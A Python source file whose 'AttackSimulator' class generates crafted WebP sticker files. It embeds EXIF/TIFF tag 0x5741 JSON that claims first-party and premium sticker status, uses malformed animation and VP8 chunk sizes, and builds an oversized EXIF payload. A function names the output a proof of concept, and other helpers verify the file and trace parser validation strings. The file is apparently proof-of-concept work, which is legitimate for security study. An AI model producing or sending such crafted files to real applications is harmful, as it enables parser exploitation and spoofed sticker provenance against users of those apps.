import struct, json
from noctua.loaders.webp import WebPParser, TIFFParser

class AttackSimulator:
    TIFF_TAG_WA = 0x5741

    @staticmethod
    def make_tiff_ifd(tag, tag_type, count, value_offset):
        return struct.pack('<HHI', tag & 0xFFFF, tag_type & 0xFFFF, count) + struct.pack('<I', value_offset)

    @staticmethod
    def make_exif_data(json_data):
        json_bytes = json.dumps(json_data, separators=(',', ':')).encode() + b'\x00'
        tiff = b'II' + struct.pack('<H', 42) + struct.pack('<I', 8)
        tiff += struct.pack('<H', 1)
        tiff += struct.pack('<HHI', AttackSimulator.TIFF_TAG_WA, 7, len(json_bytes))
        tiff += struct.pack('<I', 26) + struct.pack('<I', 0)
        tiff += json_bytes
        if len(tiff) % 2:
            tiff += b'\x00'
        return tiff

    @staticmethod
    def make_webp_sticker(exif_data=None):
        if exif_data is None:
            exif_data = AttackSimulator.make_exif_data({
                "sticker-pack-id": "poc",
                "is-first-party-sticker": 1,
                "is-from-sticker-maker": 0,
                "sticker-maker-source-type": 0,
                "premium": 2
            })
        vp8x = b'\x00' * 4 + struct.pack('<I', 0x20001000) + b'\x00' * 2
        anif = struct.pack('<IH', 0, 0)
        alph = struct.pack('<H', 0x1000)
        vp8 = struct.pack('<I', 0x2a00009c) + struct.pack('<I', 0x2c000000) + b'\x00' * 16
        anmf_header = struct.pack('<IH', 1, 1) + struct.pack('<III', 0, 0, 0)
        anmf = anmf_header + alph + vp8
        exif_chunk = b'EXIF' + struct.pack('<I', len(exif_data)) + exif_data
        body = vp8x + anif + anmf + exif_chunk
        webp = b'RIFF' + struct.pack('<I', 12 + len(body)) + b'WEBP' + body
        return webp

    @staticmethod
    def make_oversized_exif_webp():
        big_json = {"x": "A" * 2000}
        exif = AttackSimulator.make_exif_data(big_json)
        return AttackSimulator.make_webp_sticker(exif)

    @staticmethod
    def trace_exif_validation(engine):
        results = []
        for off, s in getattr(engine, 'strings', {}).items():
            for kw in ['sticker', 'exif', 'tiff', 'first-party', 'sticker-maker', 'WA']:
                if kw in s.lower():
                    results.append({'offset': off, 'string': s[:80], 'keyword': kw})
                    break
        return results[:30]

    @staticmethod
    def generate_poc_webp():
        return AttackSimulator.make_webp_sticker()

    @staticmethod
    def verify_webp(webp_data):
        parser = WebPParser(webp_data)
        exif_chunks = parser.find_exif_chunks()
        wa_found = False
        for ec in exif_chunks:
            tiff = TIFFParser(ec['data'])
            wa_tags = tiff.find_tag(0x5741)
            if wa_tags:
                wa_found = True
        return {
            'valid_webp': parser.is_webp,
            'chunks': len(parser.chunks),
            'has_exif': len(exif_chunks) > 0,
            'has_tag_5741': wa_found
        }
